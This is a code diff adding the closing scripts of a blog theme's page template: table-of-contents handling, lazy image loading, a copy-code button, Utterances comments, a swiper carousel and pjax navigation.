+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <script type="text/javascript">
+  var utteranceCommon = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceCommon.Theme = 'github-dark';
+    } else {
+      utteranceCommon.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceCommon.Theme)
+      utterances.setAttribute('repo', 'godownio/godownio.github.io')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceCommon.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
